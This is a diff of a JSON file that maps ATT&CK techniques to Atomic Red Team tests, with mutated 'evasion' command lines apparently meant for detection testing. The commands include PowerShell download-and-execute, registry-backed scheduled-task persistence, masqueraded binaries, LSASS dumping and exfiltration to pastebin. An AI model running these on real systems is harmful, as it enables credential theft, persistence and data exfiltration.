@@ -1,38 +1,178 @@
 {
   "1": {
+    "T1059.001": {
+      "selected_test_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
+      "selected_test_name": "Invoke-AppPathBypass",
+      "evasion_hints": {
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs",
+        "Image": "C:\\Windows\\System32\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\""
+      },
+      "evasion_hints_v2": {
+        "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+        "ParentCommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\",0)(window.close)",
+        "Image": "C:\\Windows\\System32\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'"
+      },
+      "mutation_applied": true
+    },
     "T1053.005": {
       "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
       "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"SysUpdate\" /TR \"cmd /c start /min \\\"\\\" wscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run).UpdateKey)))\" /sc minute /mo 15",
+        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\"WScript.Shell\\\"\").Run \\\"\"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\\\"\"\\\")\") /sc daily /st 14:30",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c reg add HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v UpdateKey /t REG_SZ /d aW52b2tlLXdlYnJlcXVlc3QgaHR0cDovL2xvY2FsaG9zdDo4MDgwL3BheWxvYWQ= /f"
+        "TargetObject": "HKEY_CURRENT_USER\\\\SOFTWARE\\\\ATOMIC-T1053.005"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"WindowsDefender\" /TR \"mshta.exe vbscript:CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{12345678}).Data)))\\\")\" /sc onlogon",
+        "CommandLine": "schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"rundll32.exe shell32.dll,ShellExec_RunDLL powershell.exe -NoProfile -WindowStyle Hidden -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc onstart /st 09:15",
         "ParentImage": "C:\\Windows\\System32\\explorer.exe",
-        "ParentCommandLine": "explorer.exe"
+        "TargetObject": "HKEY_CURRENT_USER\\\\SOFTWARE\\\\ATOMIC-T1053.005"
+      },
+      "mutation_applied": true
+    },
+    "T1036.005": {
+      "selected_test_guid": "89ee4b5c-b1d7-4837-a28a-746d4b367cb3",
+      "selected_test_name": "Rundll32 Renamed as TeamsUpdate",
+      "evasion_hints": {
+        "Image": "C:\\Users\\Public\\TeamsUpdate.exe",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "C:\\Users\\Public\\TeamsUpdate.exe shell32.dll,Control_RunDLL",
+        "OriginalFileName": "rundll32.exe"
+      },
+      "evasion_hints_v2": {
+        "Image": "C:\\Users\\AppData\\Local\\Temp\\WindowsUpdate.exe",
+        "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"C:\\Users\\AppData\\Local\\Temp\\WindowsUpdate.exe shell32.dll,Control_RunDLL\")",
+        "OriginalFileName": "rundll32.exe"
+      },
+      "mutation_applied": true
+    },
+    "T1003.001": {
+      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+        "CommandLine": "cmd.exe /c for /f \"tokens=2\" %A in ('tasklist ^| find \"lsass\"') do C:\\Windows\\System32\\rdrleakdiag.exe /p %A /o C:\\Users\\Public\\Documents /fullmemdmp /wait 1",
+        "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs"
+      },
+      "evasion_hints_v2": {
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"C:\\Windows\\System32\\rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\AppData /fullmemdmp /wait 1\",0)(window.close)",
+        "ParentCommandLine": "C:\\Windows\\System32\\explorer.exe"
+      },
+      "mutation_applied": true
+    },
+    "T1567.003": {
+      "selected_test_guid": "1aa8f6a2-2ee7-4d05-9122-87772b0080b9",
+      "selected_test_name": "PowerShell Upload Recon Output to Pastebin API",
+      "evasion_hints": {
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"systeminfo | Out-File -FilePath $env:TEMP\\hwinfo.txt -Encoding UTF8; $content = Get-Content $env:TEMP\\hwinfo.txt -Raw; Invoke-WebRequest -Uri https://pastebin.com/api/api_post.php -Method POST -Body @{api_dev_key=\\\"9mK2pL5qR8tU1vW3xY6zA4bC7dE0fG\\\"; api_option=\\\"paste\\\"; api_paste_code=$content} | Out-Null; Remove-Item $env:TEMP\\hwinfo.txt -Force\"",
+        "DestinationHostname": "pastebin.com"
+      },
+      "evasion_hints_v2": {
+        "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\\\"WScript.Shell\\\").Run(\\\"powershell.exe -NoProfile -Command \\\\\\\"$d=Get-Content C:\\\\Users\\\\Public\\\\Documents\\\\report.txt -Raw; Invoke-RestMethod -Uri https://pastebin.com/api/api_post.php -Method Post -Body @{api_dev_key=\\\\\\\\\\\"7nK3pL6qR9tU2vW4xY7zB5cD8eF1gH\\\\\\\\\\\"; api_option=\\\\\\\"paste\\\\\\\"; api_paste_code=$d}\\\\\\\"\\\",0)\",0)",
+        "DestinationHostname": "pastebin.com"
       },
       "mutation_applied": true
     }
   },
   "2": {
+    "T1059.001": {
+      "selected_test_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
+      "selected_test_name": "Invoke-AppPathBypass",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c \"powershell.exe -Command $client = New-Object System.Net.WebClient; $script = $client.DownloadData('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); $decoded = [System.Text.Encoding]::UTF8.GetString($script); & ([scriptblock]::Create($decoded)) -Payload 'C:\\Windows\\System32\\notepad.exe'\"",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\explorer.exe"
+      },
+      "evasion_hints_v2": {
+        "Image": "C:\\Windows\\SysWOW64\\wscript.exe",
+        "CommandLine": "wscript.exe C:\\Users\\Public\\Downloads\\loader.vbs",
+        "ParentImage": "C:\\Windows\\System32\\userinit.exe",
+        "ParentCommandLine": "C:\\Windows\\System32\\userinit.exe"
+      },
+      "mutation_applied": true
+    },
     "T1053.005": {
       "selected_test_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
       "selected_test_name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
       "evasion_hints": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" wscript.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 14:30",
+        "CommandLine": "schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"cmd /c start /min \\\"\\\" mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\"WScript.Shell\\\"\").Run \\\"\"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\SystemUpdate).payload)))\\\"\"\\\")(window.close)\" /sc daily /st 14:30",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-        "ParentCommandLine": "cmd.exe /c reg add HKCU\\\\SOFTWARE\\\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f"
+        "ParentCommandLine": "cmd.exe /c reg add HKCU\\\\SOFTWARE\\\\SystemUpdate /v payload /t REG_SZ /d cGluZyBsb2NhbGhvc3Q= /f && schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"cmd /c start /min \\\"\\\" mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\"WScript.Shell\\\"\").Run \\\"\"powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\SystemUpdate).payload)))\\\"\"\\\")(window.close)\" /sc daily /st 14:30",
+        "TargetObject": "HKEY_CURRENT_USER\\SOFTWARE\\SystemUpdate"
       },
       "evasion_hints_v2": {
         "Image": "C:\\Windows\\System32\\schtasks.exe",
-        "CommandLine": "schtasks.exe /Create /F /TN \"SystemMaintenance\" /TR \"mshta.exe vbscript:Execute(\\\"Set objShell=CreateObject(\\\\\\\"WScript.Shell\\\\\\\"):objShell.Run \\\\\\\"powershell.exe -NoProfile -EncodedCommand JABkAGEAdABhAD0AKABHAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAIgBIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABBAFQATwBNAEkAQwAtAFQAMQAwADUAMwAuADAAMAA1ACIAKQAuAHQAZQBzAHQAOwBJAEUAWAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAENvAG4AdgBlAHIAdAAuAEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGQAYQB0AGEAKQApACkA\\\\\\\",0\\\\\\\")\\\")\",/sc onstart /ru SYSTEM",
-        "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-        "ParentCommandLine": "C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs"
+        "CommandLine": "schtasks.exe /Create /F /TN \"WindowsDefenderUpdate\" /TR \"wscript.exe C:\\\\Users\\\\Public\\\\Downloads\\\\task.vbs\" /sc onstart /st 09:15",
+        "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+        "ParentCommandLine": "wscript.exe C:\\\\Users\\\\Public\\\\Downloads\\\\launcher.vbs",
+        "TargetObject": "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
+      },
+      "mutation_applied": true
+    },
+    "T1036.005": {
+      "selected_test_guid": "c923e0a9-059e-4dd9-b938-0a5c0d7fa7d4",
+      "selected_test_name": "Cmd Renamed as SecurityHealthHost",
+      "evasion_hints": {
+        "Image": "C:\\Users\\Public\\SecurityHealthHost.exe",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "C:\\Users\\Public\\SecurityHealthHost.exe /c whoami",
+        "OriginalFileName": "cmd.exe"
+      },
+      "evasion_hints_v2": {
+        "Image": "C:\\Users\\Public\\SecurityHealthHost.exe",
+        "ParentImage": "C:\\Windows\\System32\\explorer.exe",
+        "CommandLine": "C:\\Users\\Public\\SecurityHealthHost.exe /c whoami",
+        "OriginalFileName": "cmd.exe"
+      },
+      "mutation_applied": true
+    },
+    "T1003.001": {
+      "selected_test_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
+      "selected_test_name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
+      "evasion_hints": {
+        "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
+        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\Public\\Documents\\diag /fullmemdmp /wait 1",
+        "ParentCommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell -NoProfile -Command Get-Process lsass | Select-Object -ExpandProperty Id | ForEach-Object { & 'C:\\Windows\\System32\\rdrleakdiag.exe' /p $_ /o C:\\Users\\Public\\Documents\\diag /fullmemdmp /wait 1 }\",0)(window.close)"
+      },
+      "evasion_hints_v2": {
+        "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+        "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
+        "CommandLine": "rdrleakdiag.exe /p 632 /o C:\\Users\\AppData\\Local\\Temp\\rdrleak /fullmemdmp /wait 1",
+        "ParentCommandLine": "wscript.exe C:\\Users\\Public\\Downloads\\launcher.vbs"
+      },
+      "mutation_applied": true
+    },
+    "T1567.003": {
+      "selected_test_guid": "1aa8f6a2-2ee7-4d05-9122-87772b0080b9",
+      "selected_test_name": "PowerShell Upload Recon Output to Pastebin API",
+      "evasion_hints": {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"systeminfo | Out-File -FilePath $env:TEMP\\hwinfo.txt -Encoding UTF8; $content = Get-Content $env:TEMP\\hwinfo.txt -Raw; Invoke-WebRequest -Uri https://pastebin.com/api/api_post.php -Method POST -Body @{api_dev_key='a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6'; api_option='paste'; api_paste_code=$content} | Out-Null; Remove-Item $env:TEMP\\hwinfo.txt -Force\"",
+        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ParentCommandLine": "cmd.exe /c start powershell.exe -NoProfile -WindowStyle Hidden -Command ...",
+        "DestinationHostname": "pastebin.com"
+      },
+      "evasion_hints_v2": {
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe vbscript:CreateObject(\"WScript.Shell\").Run(\"powershell.exe -NoProfile -Command \\\"$d=systeminfo|Out-String;Invoke-RestMethod -Uri https://pastebin.com/api/api_post.php -Method Post -Body @{api_dev_key='x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4';api_option='paste';api_paste_code=$d}\\\"\",0)",
+        "ParentImage": "C:\\Windows\\explorer.exe",
+        "ParentCommandLine": "C:\\Windows\\explorer.exe",
+        "DestinationHostname": "pastebin.com"
       },
       "mutation_applied": true
     }
